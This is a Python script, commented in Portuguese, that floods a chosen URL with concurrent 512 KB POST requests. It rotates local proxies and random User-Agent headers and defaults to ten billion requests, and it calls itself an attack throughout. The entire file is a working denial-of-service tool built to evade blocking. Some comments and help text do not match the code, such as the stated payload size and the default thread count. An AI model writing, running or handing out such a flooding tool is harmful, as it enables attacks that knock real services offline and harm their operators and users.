import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import time
import argparse
import random

# Definir proxies (se necessário)
proxies = [
    {"http": "http://localhost:8118"},
    {"http": "http://localhost:8119"},
    {"http": "http://localhost:8120"},
    {"http": "http://localhost:8121"},
    {"http": "http://localhost:8122"}
]

# Função para carregar os User-Agents a partir de um arquivo
def load_user_agents(filename):
    with open(filename, 'r') as f:
        return [line.strip() for line in f.readlines()]

# Função para fazer requisição POST com payload menor e log detalhado
def make_post_request(url, payload, user_agents, session):
    try:
        proxy = random.choice(proxies)
        # Seleciona um User-Agent aleatório da lista
        user_agent = random.choice(user_agents)
        headers = {"User-Agent": user_agent}

        start_time = time.time()  # Inicia a contagem de tempo de resposta

        # Realiza a requisição POST com o User-Agent aleatório e timeout
        response = session.post(url, data=payload, headers=headers, proxies=proxy, timeout=15)
        
        end_time = time.time()  # Termina a contagem de tempo de resposta
        elapsed_time = end_time - start_time  # Calcula o tempo total
        
        # Log detalhado da requisição e resposta
        print(f"\n[INFO] Requisição para: {url} via proxy {proxy}")
        print(f"[INFO] Payload enviado: {len(payload['data']) / 1024} KB")
        print(f"[INFO] Cabeçalhos da requisição: {response.request.headers}")
        print(f"[INFO] Código de status da resposta: {response.status_code}")
        print(f"[INFO] Tempo de resposta: {elapsed_time:.2f} segundos")
        
        return response.status_code
    except Exception as e:
        print(f"[ERRO] Erro durante a requisição: {e}")
        return str(e)

# Função para iniciar o ataque de requisições com sessão persistente
def attack(url, num_requests, payload, max_workers, user_agents):
    # Criar uma sessão para reutilizar conexões
    with requests.Session() as session:
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = [executor.submit(make_post_request, url, payload, user_agents, session) for _ in range(num_requests)]
            
            for future in as_completed(futures):
                try:
                    status_code = future.result()
                    print(f"\n[INFO] Requisição completada com status: {status_code}")
                except Exception as e:
                    print(f"[ERRO] Erro durante a requisição: {e}")

# Função para capturar argumentos da linha de comando
def get_arguments():
    parser = argparse.ArgumentParser(description="Argumentos utilizados para informar o host que deseja realizar o ataque")
    parser.add_argument('--url', type=str, required=True, help='Digite a URL que deseja realizar o ataque Ex: teste.com')
    parser.add_argument('--port', type=int, default=80, help='Porta do servidor alvo (padrão: 80)')
    parser.add_argument('--threads', type=int, default=100, help='Número de threads (padrão: 10000000000)')
    parser.add_argument('--num-requests', type=int, default=10000000000, help='Número de requisições a serem enviadas (padrão: 10000000000)')
    args = parser.parse_args()

    return args

if __name__ == "__main__":
    args = get_arguments()

    # Carregar os User-Agents do arquivo especificado
    user_agents = load_user_agents("user-agents.txt")

    # Gerando um payload menor (por exemplo, 256 KB)
    payload = {"data": "A" * 512 * 1024}  # 256 KB de dados
    
    start_time = time.time()
    
    # Iniciar o teste de carga
    attack(args.url, args.num_requests, payload, args.threads, user_agents)
    
    end_time = time.time()
    print(f"\n[INFO] Ataque realizado em {end_time - start_time:.2f} segundos.")
